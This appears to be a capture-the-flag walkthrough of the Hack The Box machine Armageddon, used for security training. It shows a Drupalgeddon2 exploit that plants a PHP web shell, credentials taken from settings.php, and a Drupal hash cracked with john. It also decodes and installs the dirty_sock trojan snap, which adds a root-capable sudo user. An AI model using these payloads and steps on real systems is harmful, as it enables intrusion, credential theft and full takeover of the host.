# Introduction

[![Armageddon](https://www.hackthebox.eu/storage/avatars/4256f259c8ac66a3eda11206371eaf8b.png)](https://app.hackthebox.eu/machines/323)

| Point | Description |
| :------:| :------: |
| Name | Armageddon |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 27 Mar 2021   |
| IP | 10.10.10.233   |
| Owned | 15 Apr 2021 |

# Short retelling
* Find vulearable version of CMS
* Using exploit and get php web shell
* Enumeration and find credentionals
* Connect to mysql database and find hash
* Get user.txt
* Find exploit for snapd
* Create and install trojan snap
* Login with creds of new user
* Get root.txt

# Enumeration

## Nmap

Recon host 10.10.10.233 with nmap. Add armageddon.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# nmap -sV -p- -sC 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 23:52 EDT
Nmap scan report for armageddon.htb (10.10.10.233)
Host is up (0.31s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1135.29 seconds
```

Ports 80 and 22 are open 

Lets check http://armageddon.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/arm1.PNG)

We can see *User Login* form. Trying to create a new account.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/arm2.PNG)

And we get error and can't log in.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/arm3.PNG)

Next step we are checking source code of page and find out about CMS *drupal* and it's version *7*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/arm4.PNG)

Searching some exploits for this version and find:

* https://medium.com/@briskinfosec/drupal-core-remote-code-execution-vulnerability-cve-2019-6340-35dee6175afa
* https://github.com/pimps/CVE-2018-7600
* https://github.com/dreadlocked/Drupalgeddon2

And we will use exploit *Drupalggedon2* on ruby language.

# Explotation

Let's run drupalgeddon2.rb and we get success.

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ruby drupalgeddon2.rb -h               
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://-h/
--------------------------------------------------------------------------------
[-] Network connectivity issue
                                                                                                                      
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ruby drupalgeddon2.rb http://armageddon.htb/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://armageddon.htb/
--------------------------------------------------------------------------------
[+] Found  : http://armageddon.htb/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo PCNQFWOO
[+] Result : PCNQFWOO
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://armageddon.htb/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://armageddon.htb/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
armageddon.htb>> hostname
armageddon.htb
armageddon.htb>> pwd
/var/www/html
```

And we get PHP Web shell to RCE.

But we can't use reverse shell because of system settings this machine.

# Privilege Escalation#1

Trying to find some credentianals..

```
armageddon.htb>> grep -r -i "password"
CHANGELOG.txt:- Fixed that following a password reset link while logged in leaves users unable
CHANGELOG.txt:  to change their password (minor user interface change:
CHANGELOG.txt:  elements, such as textfields, textareas, and password fields (API change:
CHANGELOG.txt:- Changed the password reset form to pre-fill the username when requested via a
...
sites/default/default.settings.php: *     'password' => 'password',
sites/default/default.settings.php: * by using the username and password variables. The proxy_user_agent variable
sites/default/default.settings.php:# $conf['proxy_password'] = '';
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: * username, password, host, and database name.
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: *     'password' => 'password',
sites/default/settings.php: *     'password' => 'password',
sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
sites/default/settings.php: * by using the username and password variables. The proxy_user_agent variable
sites/default/settings.php:# $conf['proxy_password'] = '';
themes/bartik/css/ie.css:#password-strength-text {
themes/bartik/css/style-rtl.css:/* -------------- Password Meter  ------------- */
...
```

And we find interesting password *'password' => 'CQHEy@9M*m23gBVj',* in file *sites/default/settings.php*.

Let's read this file

```
armageddon.htb>> cat sites/default/settings.php 
<?php

/**
 * @file
 * Drupal site-specific configuration file.
 *
 
...

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

...

```

And we find out credentinals to connect mysql database

```
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj'
```

Let's do it.

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases'
Database
information_schema
drupal
mysql
performance_schema
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal'

armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```

And we see interesting table *users*.

Let's display all the data from this table.

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users'
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone      language        picture init    data
0                                               NULL    0       0       0       0       NULL            0            NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu          filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu   a:1:{s:7:"overlay";i:1;}
3       hackme  $S$DxsFQHSyj97COJGAMpG9.lQ2Rs.JfgWvZ3.UOxs6AEM6u3ufaRlo hackme@gmail.com                        filtered_html 1618466489      0       0       0       Europe/London           0       hackme@gmail.com        NULL
4       test    $S$DPgrTXFj3pss3Wzr3ZWBz5td6hTHiFlY22BTLio6pzR9qVnkvKwf test@gmail.com                  filtered_html1618468492       0       0       0       Europe/London           0       test@gmail.com  NULL
5       test2   $S$DEKacolsr/JKrKNyomMSuIkJxglGevxTDFx.kIN4NvKsoUga6WR2 tayjojo33@gmail.com                     filtered_html 1618468535      0       0       0       Europe/London           0       tayjojo33@gmail.com     NULL
6       root    $S$DDrl6y0OosU1W8mH6kiX31UblBCK9BnxtW1gzwMBJHOVv70GCyJJ root@gmail.com                  filtered_html1618469566       0       0       0       Europe/London           0       root@gmail.com  NULL
7       pash3nlee       $S$D0cZ4vGpe9fhctcXeEy6hOQ/X4d9JOWIi5dx5NYWZRqpW4SqhIZN pasha@armageddon.htb                 filtered_html    1618473501      0       0       0       Europe/London           0       pasha@armageddon.htb    NULL
8       spamfakefor     $S$Dff.4TQypd64ohmlv5SlUphbfyulw6zhCbYo1vH69PY8heUHpQbm spam@fake.for                   filtered_html 1618473949      0       0       0       Europe/London           0       spam@fake.for   NULL
9       spam    $S$Dsby3tDVVA08hQdjojdOk0AxY5A3d5/.1tCqW5Q4hdxSHSlhPC1. spam@gmail.com                  filtered_html1618474013       0       0       0       Europe/London           0       spam@gmail.com  NULL
armageddon.htb>> 
```

And we find credentials

```
brucetherealadmin
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

Password looks like hash. so let's run [john](https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/).

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# cat pass.hash                                                                
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:00 DONE (2021-04-15 11:08) 1.063g/s 246.8p/s 246.8c/s 246.8C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

And we get password **booboo**

Use ssh to connect

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ssh brucetherealadmin@armageddon.htb             
brucetherealadmin@armageddon.htb's password: 
Last login: Thu Apr 15 09:39:12 2021 from 10.10.14.43
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

And we find **user.txt**

```
[brucetherealadmin@armageddon ~]$ cat user.txt 
07aac9a86c708f4d45ce26d56e6eb226
```

# Privilege Escalation#2

Lets try to find way for Privilege Escalation with [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

In the report we can't find something interesting.

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

We can run install anap package with sudo privileges.

I get hints how to exploit it.

I found some articles about exploits for snap:

* https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
* https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
* https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html

The github python script *dirty_sockv2.py* doen't work with this version of snap.

But we can use base64 string

```
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')
```

We need to decode and write it to .snap file.

```
[brucetherealadmin@armageddon tmp]$ python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > pasha.snap
[brucetherealadmin@armageddon tmp]$ cat pasha.snap
hsqs!V\�������������>x#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
name: dirty-sock
version: '0.1'
summary: Empty snap, used for exploit
description: 'See https://github.com/initstring/dirty_sock

  '
architectures:
- amd64
confinement: devmode
grade: devel
�YZ��7zXZi"�6�S�!�����K]j;n��Q▒b3ʶ]I-▒�,����Hʭ�E��k�qj|�$l5K��(�y����#�J_ͼӡ�h�D��uy������e�?U�V���þ�Xx�h#�?>0
�YZ8��<\���>��[brucetherealadmin@armageddon tmp]$                                 �'�yE@��g��o�G>0
[brucetherealadmin@armageddon tmp]$ 
```

This bash script add user *dirty sock" with root's privileges.

And install trojan snap *pasha.snap*

```
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode pasha.snap 
dirty-sock 0.1 installed
```

And we get new user *dirty_sock*. 

```
[brucetherealadmin@armageddon tmp]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
```

Login with pass *dirty_sock*.
This user can run every command with sudo privileges.
Get root.txt

```
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: 
[dirty_sock@armageddon tmp]$ id
uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[dirty_sock@armageddon tmp]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: 
Matching Defaults entries for dirty_sock on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User dirty_sock may run the following commands on armageddon:
    (ALL : ALL) ALL
[dirty_sock@armageddon tmp]$ sudo su
[root@armageddon tmp]# cat ~/root.txt 
330c849014f70b5f49124679801434fa
```

# Resources

1. https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
2. https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
3. https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html
4. https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
5. https://medium.com/@briskinfosec/drupal-core-remote-code-execution-vulnerability-cve-2019-6340-35dee6175afa
6. https://github.com/pimps/CVE-2018-7600
7. https://github.com/dreadlocked/Drupalgeddon2

